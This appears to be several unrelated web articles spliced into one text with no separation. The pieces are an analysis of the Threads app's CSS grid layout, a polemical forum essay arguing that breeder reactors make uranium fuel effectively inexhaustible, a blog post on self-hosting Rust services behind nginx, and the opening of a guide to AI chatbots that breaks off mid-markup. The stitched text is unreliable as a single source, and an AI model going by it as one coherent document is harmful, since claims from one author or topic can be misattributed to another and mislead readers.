<p>Here is a <strong>before &amp; after</strong> look for an avatar with and without the <code>padding-top</code> treatment:</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-avatar.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>The other reason for applying the <code>padding-top</code> here could be to push the avatar all the way down and make it closer to the line.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-avatar-2.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<h3 id="using-odd-values-for-the-grid-rows">Using odd values for the grid rows</h3>

<p>Why use <code>21px</code> and <code>19px</code> as row values? After inspecting further, it seems to be a form of fine-tuning for the UI. The sum of the row heights is <code>40px</code>, which accounts for the avatar height plus the <code>padding-top</code> (36px + 4px).</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-grid-rows.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>You might be curious why these values are not standardized. Design systems are commonly associated with the belief that designers must strictly follow predefined rules for UI elements.</p>

<p>However, this example shows that using manually adjusted values can be acceptable. It’s okay to deviate from strict guidelines in certain situations.</p>

<h3 id="limitations-of-using-fixed-size-rows">Limitations of Using Fixed-Size Rows</h3>

<p>Due to the fixed widths of the first two rows, it’s not possible to add padding to them. Nevertheless, as long as you’re aware of this limitation, it can be worked around by using margins instead.</p>

<p>Here is an example:</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-fixed-size-rows.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>Adding top and bottom padding didn’t affect the post header due to the fixed-size rows.</p>

<h3 id="the-space-between-the-layout-columns-feels-a-bit-hacky">The space between the layout columns feels a bit hacky</h3>

<p>The current gap between the layout columns is zero. Instead, the image has a size of <code>36*36</code> pixels, whereas its container is <code>48</code> pixels in width.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-spacing.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>This mimics the spacing here. I don’t know why the team opt-in for that, but I would prefer to use <code>gap</code> instead.</p>

<h3 id="why-not-use-named-css-grid-areas">Why not use named CSS grid areas?</h3>

<p>Based on what I’ve observed so far, there are three variations of the grid layout, and all of them could benefit from using named grid areas.</p>

<p>I tried to replicate the grid and build it based on the named areas. It looks easier to scan than specifying values for the columns and rows.</p>

<p>To demonstrate this, let’s assign a <code>grid-area</code> to each item in the layout:</p>

<div><pre><code><span>.AvatarContainer</span> <span>{</span>
  <span>grid-area</span><span>:</span> <span>avatar</span><span>;</span>
<span>}</span>

<span>.HeaderContainer</span> <span>{</span>
  <span>grid-area</span><span>:</span> <span>header</span><span>;</span>
<span>}</span>

<span>.BodyContainer</span> <span>{</span>
  <span>grid-area</span><span>:</span> <span>body</span><span>;</span>
<span>}</span>

<span>.ThreadlineContainer</span> <span>{</span>
  <span>grid-area</span><span>:</span> <span>line</span><span>;</span>
<span>}</span>

<span>.FooterContainer</span> <span>{</span>
  <span>grid-area</span><span>:</span> <span>footer</span><span>;</span>
<span>}</span>
</code></pre></div>

<h4 id="variation-1-the-default">Variation 1: the default</h4>

<p>Then, we can start working on the variations. Here is the default layout:</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-grid-area-1.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<div><pre><code><span>.post</span> <span>{</span>
  <span>display</span><span>:</span> <span>grid</span><span>;</span>
  <span>grid-template-columns</span><span>:</span>
    <span>var</span><span>(</span><span>--barcelona-threadline-column-width</span><span>)</span>
    <span>minmax</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>fr</span><span>);</span>
  <span>grid-template-rows</span><span>:</span> <span>21px</span> <span>19px</span> <span>max-content</span> <span>max-content</span><span>;</span>
  <span>grid-template-areas</span><span>:</span>
    <span>"avatar header"</span>
    <span>"avatar body"</span>
    <span>". body"</span>
    <span>". footer"</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>Note the use of <code>.</code> to represent empty spaces.</p>

<h4 id="variation-2-the-reply">Variation 2: the reply</h4>

<p>A variation is when someone replies to another.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-grid-area-2.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<div><pre><code><span>.post--reply</span> <span>{</span>
  <span>grid-template-rows</span><span>:</span> <span>36px</span> <span>0</span> <span>max-content</span> <span>max-content</span><span>;</span>
  <span>grid-template-areas</span><span>:</span>
    <span>"avatar header"</span>
    <span>"body body"</span>
    <span>"body body"</span>
    <span>"footer footer"</span><span>;</span>
<span>}</span>
</code></pre></div>

<h4 id="variation-3-the-default-with-a-thread-line">Variation 3: the default with a thread line</h4>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-grid-area-3.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<div><pre><code><span>.post--withLine</span> <span>{</span>
  <span>grid-template-areas</span><span>:</span>
    <span>"avatar header"</span>
    <span>"avatar body"</span>
    <span>"line body"</span>
    <span>"footer footer"</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>Using named grid areas here made it possible to change the layout by editing in one place only.</p>

<h2 id="svg-for-the-thread-lines">SVG for the thread lines</h2>

<p>To be honest, what initially caught my attention in the Threads app was the swirl line. I became curious about how it was constructed since I had previously written about <a href="https://ishadeed.com/article/comment-component/">a similar topic</a> a few weeks ago.</p>

<p>See the following figure:</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-line.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>That line connecting my avatar to Mark’s one is an SVG path. It consists of three parts.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-line-2.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>The length of the first part is calculated with JavaScript.</p>

<h2 id="inline-css-variables-for-css-grid">Inline CSS variables for CSS grid</h2>

<p>I’m happy to see a thing that I and many others <a href="https://ishadeed.com/article/css-variables-inline-styles/">advocated for</a> is being used on a large-scale app like Threads.</p>

<p>In the user profile, the tabs grid layout is built with an inline CSS variable that includes the count of the tabs.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-inline-css-vars.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>This is useful. When the number of tabs increased, we only need to change the value of the CSS variable. Neat, right?</p>

<h2 id="overflow-wrapping">Overflow wrapping</h2>

<p>I noticed the use of <code>overflow-wrap: anywhere</code> for the post body. I haven’t used or heard of that keyword before. I use <code>break-word</code>.</p>

<p>As per <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/overflow-wrap">MDN</a>, it’s the same as <code>break-word</code> but with one additional thing:</p>

<blockquote>
  <p>Soft wrap opportunities introduced by the word break are considered when calculating min-content intrinsic sizes.</p>
</blockquote>

<p>I still didn’t find a difference when using <code>break-word</code> vs <code>anywhere</code>. I’m very curious to know why, if any of the Threads team is reading this.</p>

<h2 id="the-use-of-dynamic-viewport-units">The use of dynamic viewport units</h2>

<p>I like the use of the dynamic viewport unit <code>dvh</code> for the splash screen.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-splash-dvh.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>If you want to learn more, I wrote a detailed article on <a href="https://ishadeed.com/article/new-viewport-units/">the new viewport units</a>.</p>

<h2 id="defensive-css-strategies">Defensive CSS strategies</h2>

<p>To make sure that a flexbox layout won’t break because of the minimum content length, <code>min-width: 0</code> is used to reset that behavior.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-splash-min-width.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>Read more about this in my <a href="https://defensivecss.dev/tip/flexbox-min-content-size/">defensive CSS post</a> about the minimum content size in flexbox.</p>

<h2 id="conclusion">Conclusion</h2>

<p>That’s it for today. I enjoyed inspecting the CSS and getting to know how the Threads team is building the product. I’m sure there are a lot of things that I haven’t noticed because this is the preview-only version on the web.</p>

<div id="readability-page-1" class="page"><div itemprop="articleBody">
              <p>Providing energy for a global economy in which billions of people in developing countries aspire to a lifestyle similar to that of Europe, North America, and East Asia is one of the most daunting challenges of the 21st century.  Even with all of the potentials for improving efficiency in energy use, this will require a dramatic increase in energy production and consumption.  The U.S. Energy Information Administration forecast in 2019 that global energy use would increase almost 50% between 2018 and 2050 (“<a href="https://www.eia.gov/todayinenergy/detail.php?id=41433">EIA projects nearly 50% increase in world energy usage by 2050, led by growth in Asia</a>”), and this does not account for increasing the standard of living for the burgeoning population of Africa.</p>
<p><img src="https://scanalyst.fourmilab.ch/uploads/default/original/2X/e/e9709de53a70957e23e65e885e0962fc8c646520.png" alt="EIA_2050" data-base62-sha1="xj6wUYseEAxnjBHCIfr5xK0weZy" width="588" height="276"></p>
<p>(Many different units are used to discuss large quantities of energy.  The graph above uses “<a href="https://en.wikipedia.org/wiki/Quad_(unit)">quads</a>”, or quadrillion (<span>10^{15}</span>) <a href="https://en.wikipedia.org/wiki/British_thermal_unit">British Thermal Units</a>.  The <a href="https://en.wikipedia.org/wiki/International_System_of_Units">SI</a> unit of energy is the <a href="https://en.wikipedia.org/wiki/Joule">joule</a>, and a comparable quantity is the exajoule (EJ), with:</p>
<p>
1\ {\rm EJ} = 10^{18}\ {\rm joule}= 0.948\ {\rm quad} = 9.48\times 10^{14}\ {\rm BTU}
</p>
<p>Smaller quantities of energy are sometimes expressed in terawatt hours, with one exajoule equal to around 278 terawatt hours.)</p>
<p>Meeting these needs will require the development of new energy resources and the means to deliver them worldwide.  Currently, fossil fuels supply around 85% of world energy needs.  Producing the additional energy with the same mix of fuels risks exhausting supplies recoverable at an affordable price, altering Earth’s climate due to releasing combustion products into the atmosphere, geopolitical instability due to concentration of resources in certain geographical regions, and pollution due to production, refining, transportation, and combustion of fuels.  All of these concerns have motivated searches for other energy sources which do not run these risks.</p>
<p>The term of art for the goal of this quest is “sustainable energy”, which is often taken to imply “renewable energy” produced from sources such as hydroelectric, photoelectric solar, or wind power, all of which are ultimately ways of exploiting the energy of the Sun which, while neither renewable nor sustainable, may be expected to substantially exceed the time horizon of “policy makers”.  Unfortunately, these resources are limited in quantity and either largely already exploited (hydroelectric) or intermittent (solar, wind) and poorly suited to provide reliable, inexpensive, “base load” power.</p>
<p>Using the United States as a proxy for the developed world, let’s look at an energy source and use flowchart for the U.S. in 2018 prepared by Lawrence Livermore National Laboratory, found and posted here in an earlier discussion by <a href="https://scanalyst.fourmilab.ch/u/drlorentz">@drlorentz</a>.

<p>Since U.S. consumption happened to be 101.2 quads, you can read the numbers in the chart as percentages with only a little imprecision.  While those speaking of “sustainable energy” often concentrate on sources of electricity, note that electricity currently accounts for less than 40% of energy use, with the balance direct consumption for space heating, transportation, industrial process heat, and other applications.  Thus, any proposed energy source which produces electricity must, to replace current fossil fuel consumption, also imply the electrification of those uses which, in itself, may be a challenging prospect.  Battery technology has only recently made electric automobiles marginally practical, and is far from that required to replace turbine engines for air transport.  Electrification of other large bulk uses of energy will require dramatic expansion of the electrical grid, from bulk distribution through local delivery to consumers.</p>
<p>When its development began in the 1950s, power generated by nuclear fission was heralded as the energy source for the future.  I am old enough to remember when the “atomic age” was used in a non-ironic fashion.  The energy density of uranium, exploited optimally, is more than a million times greater than than of fossil fuels, and producing electricity from it emits no carbon dioxide, smoke, or noxious gas pollutants.  Since its energy density is so great, nuclear power plants are compact and require little land compared to low density sources such as solar power farms or wind turbine arrays.  Finally, the mining and refining of the small quantities of uranium fuel required and the modest quantities of radioactive waste produced have a small environmental impact compared to producing, transporting, and burning fossil fuels.</p>
<p>But due to historical accidents, lack of imagination, government bungling and regulation, incompetent engineering and operation leading to a small number of highly-visible accidents, fear mongering by media and ignorant advocates of other technologies or abandonment of our energy-intensive modern civilisation, nuclear fission power never achieved the ambitious goals (“too cheap to meter”) it originally seemed to promise.</p>
<p>Today, nuclear power is not usually considered among the “sustainable” alternatives to fossil fuels and, since it relies upon uranium as a fuel, of which a finite supply exists on Earth, is classified as “non-renewable” and hence not viable as a long-term energy source.  But what do you mean “long-term”, anyway?  Eventually, the Sun will burn out, after all, so even solar isn’t forever.  Will ten thousand years or so do for now, until we can think of something better?</p>
<p>Energy “experts” scoff at the long-term prospects for nuclear fission power, observing that known worldwide reserves of uranium, used in present-day reactor designs, would suffice for only on the order of a century if nuclear power were to replace all primary power generation sources presently in use.  But is this correct?  In fact, this conclusion stems not from science and technology, but stupidity and timidity, and nuclear fission is a “bird in the hand” solution to the world’s energy problems awaiting only the courage and will to deploy it.</p>
<p>That is the conclusion by the authors of a paper with the same title as this post, “<a href="https://www.fourmilab.ch/fourmilog/archives/2022/04/24/Nuclear_Fission_Fuel_is_Inexhaustible.pdf">Nuclear Fission Fuel is Inexhaustible</a>” [PDF, 8 pages], presented at the IEEE EIC Climate Change Conference in Ottawa, Canada in May 2006.  Here is the abstract:</p>
<blockquote>
<p>Nuclear fission energy is as inexhaustible as those energies usually termed “renewable”, such as hydro, wind, solar, and biomass. But, unlike the sum of these energies, nuclear fission energy has sufficient capacity to replace fossil fuels as they become scarce. Replacement of the current thermal variety of nuclear fission reactors with nuclear fission fast reactors, which are 100 times more fuel efficient, can dramatically extend nuclear fuel reserves. The contribution of uranium price to the cost of electricity generated by fast reactors, even if its price were the same as that of gold at US$14,000/kg, would be US$0.003/kWh of electricity generated. At that price, economically viable uranium reserves would be, for all practical purposes, inexhaustible. Uranium could power the world as far into the future as we are today from the dawn of civilization—more than 10,000 years ago. Fast reactors have distinct advantages in siting of plants, product transport and management of waste.</p>
</blockquote>
<p>Let’s have a look at the argument.  (First, note that when this paper was published in 2006, the price of gold was quoted as US$ 14,000/kg, or around US$ 435 per troy ounce, while in early 2022, gold is around US$ 1900 per troy ounce, or US$ 62,000/kg.  So comparisons of “uranium at the price of gold” should keep that in mind.  If uranium were to increase to near the present gold price, the quantity of economically viable ore would increase accordingly.)</p>
<p>Let’s begin by investigating replacing all fossil fuels with electricity generated from nuclear fission.  The following table gives fuel consumption for energy generation worldwide in 2005 for the main areas of consumption in exajoules (which, for estimates like these, are close enough to quads that you can read them whichever way you prefer), the nuclear generated electricity required to replace that energy consumption, and the ratio of fossil fuel energy to nuclear electricity required for the replacement.</p>
<p><img src="https://scanalyst.fourmilab.ch/uploads/default/original/2X/3/357e54eba295b7fd5cdbc36e297430e9bcbd29f7.png" alt="energy2005" data-base62-sha1="7DdYacHAOkXZVZgaY2brNKFkKCr" width="454" height="242"></p>
<p>While electric generation can be replaced one for one, replacing space and process heat is assumed to require twice the amount of nuclear-generated electricity to account for the efficiency of generation, losses in transmission over the grid, and efficiency in conversion at the consumer location.  For transportation, the ratio is estimated as four to one on the assumption that synthetic fuel is manufactured from the nuclear-generated electricity.  Migration to vehicles directly powered by electricity may decrease this ratio.  Adding these gives an estimate that it would take about twice the nuclear generating capacity to replace all applications of fossil fuels.</p>
<p>Next, we move on to estimating long-term global energy consumption assuming world population levels off around the year 2100 and that per capita energy consumption worldwide rises to its current level in Europe.  This gives a rise from the present level to about 2500 exajoules (or quads) per year in 2200, remaining roughly constant thereafter.  Combining with the earlier calculation, this implies replacing all fossil fuels with nuclear electricity will require around 5000 exajoules per year of generating capacity.</p>
<p>Now let us consider the design of the reactors used in nuclear electric power stations.  Essentially all civil power stations in use worldwide, whether pressurised water, boiling water, graphite moderated, or other designs, are “<a href="https://en.wikipedia.org/wiki/Thermal-neutron_reactor">thermal neutron reactors</a>”.  This means they employ a moderator substance such as water or graphite to slow down neutrons emitted by nuclear fission to increase the probability they will fission another uranium nucleus, thereby maintaining the chain reaction.  This kind of reactor can only fission the U-235 isotope of uranium, which makes up just 0.71% of natural uranium mined from the Earth.  This means that the rest, the 99.28% U-238, is “just along for the ride” and generates only a small amount of power through the secondary reaction of production of fissile plutonium-239 from absorbed neutrons.  The upshot of this is that a thermal reactor extracts around 1% of the energy in its uranium fuel, with the rest being discarded as nuclear waste, requiring long-term storage.  The “once-through” fuel cycle used in the United States, which does not even reprocess spent fuel to extract plutonium and unreacted U-235 to fabricate new fuel, is even less efficient, but we’ll assume sanity will eventually put an end to that stupidity, even in safetyland.</p>
<p>The main alternative to thermal reactors is variously called a “fast reactor” or “<a href="https://en.wikipedia.org/wiki/Breeder_reactor">breeder reactor</a>”.  This design has been used in various reactors since the early days of nuclear research and, in fact, the first electrical power ever produced from nuclear energy was by a fast breeder reactor called <a href="https://en.wikipedia.org/wiki/Experimental_Breeder_Reactor_I">EBR-I</a> in the year 1951.  A fast reactor does not use a moderator, but instead uses fast neutrons in higher enriched uranium to create fission which, by generating more neutrons per nucleus split, strike nuclei of U-238 and transmute them into plutonium.  The reactor is called a “breeder” because it produces more fuel in the form of plutonium than it consumes.  Spent fuel is reprocessed, extracting the plutonium (which, as a chemical process, is much simpler and less expensive than enriching uranium), that is fed back into the reactor to keep the cycle going.  A mature fast breeder reactor and reprocessing cycle can extract essentially all of the energy in the natural uranium with which it is fed, or a <em>hundred times more</em> than a thermal reactor.  As an extra benefit, the fast reactor “burns up” most of the long-lived fission products that make nuclear waste difficult to store and produces waste which is largely innocuous after around 500 years.  Finally, most fast breeder designs use liquid metal as a coolant, which allows them to run at a higher temperature than water-cooled reactors, improving the thermal efficiency of steam production for power generation and (modestly) increasing electrical power output.</p>
<p>So, by moving from wasteful thermal reactors to fast breeders and using no more nuclear fuel, you can increase the estimated number of years nuclear fission can supply our energy needs by a factor of a hundred.  But we’re not done yet.</p>
<p>Finally, consider where that uranium is coming from and what we’re paying for it.  Natural uranium (0.71% U-235) is a commodity <a href="https://en.wikipedia.org/wiki/Uranium_mining">mined in a number of regions</a> of the world, with production in 2019 amounting to 53,656 tonnes.  Over the last decade, the price of natural uranium has fluctuated in the range between US$ 55/kg to US$ 110/kg.  At those prices, the cost of uranium is almost a negligible component of the cost of nuclear-generated electricity.  Even in thermal reactors, the cost of uranium accounts for only around US$0.0015/kWh, compared to an average retail price of electricity in the U.S. of about US$0.10/kWh.</p>
<p>Assume the price of uranium were to rise to the vicinity of US$14,000/kg, which was the price of gold when the paper was published in 2006.  That would make economically viable the exploitation of very low-grade ore (or, if you prefer, high-grade dirt) containing only 1000 parts per million of uranium.  It is estimated that at a price of US$14,000/kg for uranium, recoverable reserves would rise to between 40 and 50 times those estimated based on the current price of uranium.</p>
<p>And yet, even at this price, using the costly uranium in fast breeder reactors, the fuel cost of the electricity produced would be less than US$0.003/kWh.</p>
<p>Here are various estimates of the world supply of uranium with mine reserves calculated for its recent price.  All numbers in this table are <em>thousands</em>, so the thermal reactor generation power potential from line 2, from an estimate made in 2000 by the <a href="https://en.wikipedia.org/wiki/Intergovernmental_Panel_on_Climate_Change">Intergovernmental Panel on Climate Change</a> (IPCC), should be read as 7700 exajoules, for 15,400,000 tonnes of uranium.</p>
<p><img src="https://scanalyst.fourmilab.ch/uploads/default/original/2X/9/9b6b378830f65044b642a1537b3ce26c45e8d577.png" alt="nucfuel" data-base62-sha1="maTIAhiZw7flNbBpRA7FJbsuLPN" width="492" height="334"></p>
<p>Going back to our estimate of 2500 exajoules per year for worldwide consumption replacing all fossil fuels after 2100, this doesn’t look very good—we’ll burn up the entire world’s uranium supply in just three years!  But now, re-run the numbers assuming we replace the thermal reactors with fast breeders.  Now we’re generating 1,223,000 exajoules from the same amount of uranium, providing power for almost 500 years.  But the IPCC estimate was based upon uranium at around US$70/kg.  If we let that rise to US$14,000 and assume that will increase the supply recoverable at that price by a factor of 40, we now have uranium sufficient for around 19,500 years of power!</p>
<p>And that’s not all.  Another 20,000,000 tonnes of uranium are recoverable from phosphate deposits, and 4.4 billion tonnes more could potentially be recovered from seawater, should we need to start exploring that option, say, 15000 years in the future.</p>
<p>Every technology mentioned in this article, with the sole exception of recovery of uranium from seawater, which wouldn’t be needed for many millennia, already exists, has been demonstrated at scale, most over periods of decades.  None requires breakthroughs in fundamental science, engineering that has not already been demonstrated long ago, or investments larger than those contemplated for other alternatives to fossil fuels.</p>
<p>The endpoint of the adoption of this energy path is the complete replacement of fossil fuels with nuclear power, reserving these valuable hydrocarbon resources as feedstocks for industry, total elimination of carbon emission from fuel consumption and pollution from power generation, heating, and transportation, and an assured supply of energy for a stable human population on Earth at developed nation standard of living for millennia into the future.  As the authors conclude:</p>
<blockquote>
<p>Many of the most serious problems facing human society have an important energy component. We do not know when peak production for fossil fuels will come, but we know that it will eventually arrive. Considering the importance of energy to humanity, it would be prudent to have a substantial program for the development and commissioning of fast nuclear fission reactors under way now in order to be adequately prepared.</p>
</blockquote>
<p>Certainly, there are challenges in mass adoption of fast breeder reactors and electrification of all fossil fuel applications.  Fast breeders, like any nuclear reactor, are a demanding technology which is intolerant of shoddy engineering, construction, maintenance, or operation.  Mass deployment involves commerce in highly enriched nuclear fuels which can be diverted for nuclear weapons purposes.  Siting and building the required generating stations, fuel reprocessing plants, and fuel fabrication facilities will probably be the object of intense “environmental” and “not in my backyard” opposition.  Fear-mongers may be expected to gin up opposition to any human future which does not involve half-naked pithecanthropoids digging for grubs with dull sticks,  and design, construction, management, and operation of these facilities will require teams of people recruited, evaluated, and compensated by merit, not metrics of “diversity”, “equity”, or “inclusion”.</p>
<p>Problems are inevitable, but problems have solutions.  Humans are universal problem solvers—it’s <em>what we do</em>.  A solution to the long-term supply of energy for human civilisation on Earth is at hand, and has been for years.  It is up to us whether to grasp it, continue to pursue things which an evening’s calculation will show are folly, or chase dreams in the future which may never be realised.</p>
<p>Choose wisely.</p>

<div id="readability-page-1" class="page"><div>
        <p>I've been writing recently about servers and internet infrastructure<sup id="fnref1"><a href="#fn1">1</a></sup>. A lot of this writing is predicated on running server software on a VM or physical machine, rather than using a more cloudy solution, which is somewhat unpopular these days. However, I think it's a pretty reasonable way to do things, and it's not as difficult as many people make it out to be. This post is a simple description of how I run most of the servers I operate. It mostly describes running server software that I've written myself, since that allows me to make it much more robust and easy to deploy than the vast majority of off-the-shelf software is.</p>

<p>This describes roughly the setup for <a href="https://thoughts.page/">thoughts.page</a>, <a href="https://hanabi.site/">hanabi.site</a>, <a href="https://github.com/WesleyAC/cgmserver">cgmserver</a>, <a href="https://github.com/WesleyAC/phonebridge">phonebridge</a>, and a few other services.</p>

<p>These apps run on DigitalOcean VMs — the $5/month tier. (Some of them are on the same VM, some on different VMs — more on that later). The VMs run Debian 10.</p>

<p>The server software is written in Rust. It's statically linked, and all of the html, css, config, secrets, etc are compiled into the binary. I accomplish this with <a href="https://github.com/emk/rust-musl-builder">rust-musl-builder</a> and <a href="https://github.com/pyros2097/rust-embed">rust-embed</a>. This means that deployment only requires copying a single file to the server. You can do similar things in languages like Go, C++, etc, and probably others, although I don't know the details of how exactly to accomplish it in those languages. If you're using a language that doesn't let you do this easily, a good alternative would be building a Docker container as your build artifact, which similarly will give you a single file to deploy.</p>

<p>I use systemd to ensure that the binary starts when the server is started. Most of my systemd unit files are <a href="https://gist.github.com/WesleyAC/b3aaa0292579158ad566c140415c875d#file-example-service">9 lines long and extremely simple</a>. systemd itself is quite complicated, but just starting a server on boot does not expose you to most of that complexity.</p>

<p>I use a <a href="https://blog.wesleyac.com/posts/simple-deploy-script">simple deploy script</a> that copies the binary to the server and restarts the server, taking a little bit of care to allow rollbacks and ensure that there will always be a valid version running, even if my connection drops while I'm deploying.</p>

<p>Programs that require a database use <a href="https://blog.wesleyac.com/posts/consider-sqlite">SQLite</a>, which means that the entire state of the app is kept in a single file. I have two redundant backup solutions: On a daily basis, a backup is taken via the <a href="https://sqlite.org/cli.html">SQLite <code>.backup</code> command</a>, and saved to <a href="https://www.tarsnap.com/">Tarsnap</a>. The script to do so is run via <a href="https://en.wikipedia.org/wiki/Cron">cron</a>. I also use <a href="https://litestream.io/">Litestream</a> to stream a copy of the database to DigitalOcean Spaces storage on a secondly basis, with snapshots taken every 6 hours. This gives me quite a lot of confidence that even in the most disastrous of cases, I'm unlikely to lose a significant amount of data, and if I wanted to be more sure, I could crank up the frequency of the Tarsnap backups.</p>

<p>All of my servers run behind <a href="https://nginx.org/">nginx</a> running as a reverse proxy. The main advantage to this is that nginx can do TLS termination, which means my apps don't need to think about HTTPS at all. I get my HTTPS certs from <a href="https://letsencrypt.org/">Let's Encrypt</a> via <a href="https://certbot.eff.org/">certbot</a> — this handles automatic renewal so I don't have to do anything to keep it working. <a href="https://gist.github.com/WesleyAC/a9b4d6079854a6617f9fe6be96beddfa">Here's</a> what my nginx config for <a href="https://hanabi.site/">hanabi.site</a> looks like. Nginx also works great for serving static files — you can just <code>scp</code> or <code>rsync</code> them from your computer to the server.</p>

<p>This is a simple and extremely robust setup. All of the software on the serving path (except for the apps themselves) has been around for decades and is extremely battle-tested. There is essentially no maintenance involved in keeping a site like this running — as long as I keep paying my DigitalOcean bills, they'll keep going. The only times my monitoring has detected problems with these sites have been transient DigitalOcean networking issues. I do need to update things occasionally — Debian releases have 5 years of support, so I'll need to upgrade to Debian 11 in around two and a half years, and if (when) something like <a href="https://en.wikipedia.org/wiki/Heartbleed">heartbleed</a> happens again, I'll need to go patch it. However, events like that are quite rare.</p>

<p>One complaint about this setup is that paying $5/month for every service you want to run is a lot. This is indeed annoying, but it's quite doable to run multiple services on the same VM. In order to provide isolation, I run each service as its own unix user account. This form of isolation has been around since the dawn of unix, and thus seems quite robust. If you want more isolation, you can also use <a href="https://www.freedesktop.org/software/systemd/man/systemd-nspawn.html">systemd-nspawn</a> or <a href="https://firejail.wordpress.com/">firejail</a>. I usually don't bother, though — if something is really important to keep secure, I'll just pay the extra $5/month to run it on its own VM.</p>

<p>So, the process for setting up a new project looks like:</p>

<ul>
<li>Create a new user</li>
<li>Add a new nginx virtual host (and run certbot to get a HTTPS cert)</li>
<li>Add a systemd unit</li>
<li>Commit a <a href="https://blog.wesleyac.com/posts/simple-deploy-script">deploy script</a> to the repository and run it</li>
</ul>

<p>This can be a lot to figure out if you haven't done it before! However, one of the advantages to running things this way is that this infrastructure changes much, much more slowly than cloud infrastructure does. You only need to learn how to set up nginx once, since the config format has stayed essentially the same for the past decade<sup id="fnref2"><a href="#fn2">2</a></sup>, and is likely to remain the same in the future. The last major change to Debian system administration was the switch to systemd, nearly a decade ago. One of the comforts of running things this way is that you know that no one is going to pull the rug out from under you — no cloud provider is going to deprecate the service you're using, or silently change how it works. The only dependency is your VPS provider, and if you're unhappy with them — well, servers are a commodity, and there are a thousand other providers out there.</p>

<div id="readability-page-1" class="page"><div><article><div dir="auto"><p><span>Increasingly powerful AI systems are being released at an increasingly rapid pace. This week saw the debut of Claude 2, likely the second most capable AI system available to the public. The week before, Open AI released Code Interpreter, the most sophisticated mode of AI yet available. The week before that, some AIs </span><a href="https://www.oneusefulthing.org/p/on-giving-ai-eyes-and-ears" rel="">got the ability to see images</a><span>.</span></p><p>And yet not a single AI lab seems to have provided any user documentation. Instead, the only user guides out there appear to be Twitter influencer threads. Documentation-by-rumor is a weird choice for organizations claiming to be concerned about proper use of their technologies, but here we are.</p><p>I can’t claim that this is going to be a complete user guide, but it will serve as a bit of orientation to the current state of AI. I have been putting together a Getting Started Guide to AI for my students (and interested readers) every few months, and each time, it requires major modifications. The last couple of months have been particularly insane.</p><p><span>This guide is opinionated, based on my experience, and focused on how to pick the right tool to do things. I have written separately about </span><a href="https://www.oneusefulthing.org/p/on-boarding-your-ai-intern" rel="">the kinds of tasks you may want AI to do</a><span>, which might be useful to read first.</span></p><p><span>When we talk about AI right now, we are usually talking about Large Language Models, or LLMs. Most AI applications are powered by LLMs, of which there are just a few Foundation Models, created by a handful of organizations. Each company gives direct access to their models via a Chatbot: OpenAI makes GPT-3.5 and GPT-4, which power </span><a href="https://chat.openai.com/" rel="">ChatGPT </a><span>and Microsoft’s </span><a href="https://www.bing.com/search?q=Bing+AI&amp;showconv=1&amp;FORM=hpcodx&amp;sydconv=1" rel="">Bing </a><span>(access it on an Edge browser). Google has a variety of models under the label of </span><a href="https://bard.google.com/" rel="">Bard</a><span>. And Anthropic makes Claude and </span><a href="https://claude.ai/" rel="">Claude 2</a><span>. </span></p><p><span>There are other LLMs I won’t be discussing. The first is </span><a href="https://pi.ai/talk" rel="">Pi</a><span>, a chatbot built by Inflection. Pi is optimized for conversation, and really, really wants to be your friend (seriously, try it to see what I mean). It does not like to do much besides chat, and trying to get it to do work for you is an exercise in frustration. We also won’t cover the variety of open source models that anyone can use and modify. They are generally not accessible or useful for the casual user today, but have real promise. Future guides may include them.</span></p><p>So here is your quick reference chart, summarizing the state of LLMs:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 1272w, 